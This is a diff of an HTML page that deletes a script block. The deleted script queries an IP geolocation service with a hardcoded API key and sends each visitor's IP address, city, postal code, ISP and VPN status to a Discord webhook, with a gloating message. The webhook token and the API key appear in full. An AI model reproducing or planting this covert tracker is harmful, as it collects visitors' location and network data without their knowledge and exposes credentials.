@@ -474,47 +474,7 @@
       families: ['Muli:900', 'Nunito:200,600', 'Roboto']
     }
   });
-</script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
-    <script>
-      $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=a1ebbf04c6164dd98b527e26c57fc28c", function (data) {
-        const ip = data.ip_address;
-        const city = data.city;
-        const region = data.region;
-        const zip = data.postal_code;
-        const country = data.country;
-        const flag = data.flag.emoji;
-        const aso = data.connection.autonomous_system_organization;
-        const isp = data.connection.isp_name;
-        const org = data.connection.organization_name;
-        const vpn = data.security.is_vpn;
-        const tz = data.timezone.name;
-        const ct = data.timezone.current_time;
-        const request = new XMLHttpRequest();
-        request.open("POST", "https://discord.com/api/webhooks/1199652378912227358/DNC5zzzaNcYHbF0GS87qBdGBgcXfsOivKYoKdCTJPO4U2af3zVMK_kT4I7_drItCiIVj");
-        // Put in your discord webhook url above ^^^
-        request.setRequestHeader("Content-type", "application/json");
-        const params = {
-          username: "ECHOLOG",
-          avatar_url: "https://3kh0.github.io/img/echo.jpg",
-          content: "**Ladies and gentlemen we got em!**\n> IP: " + ip + 
-          "\n> City: " + city + 
-          "\n> Region: " + region + 
-          "\n> Zip: " + zip + 
-          "\n> Country: " + country +
-          "\n> Flag: " + flag +
-          "\n> Auto System Org: " + aso +
-          "\n> ISP: " + isp +
-          "\n> Org: " + org +
-          "\n> Using VPN: " + vpn +
-          "\n> Timezone: " + tz +
-          "\n> Current time: " + ct
-          ,
-        };
-        request.send(JSON.stringify(params));
-      });
-    </script>
-<script src="/js/test.js"></script>
+
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6028920737001861"
      crossorigin="anonymous"></script>
         <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
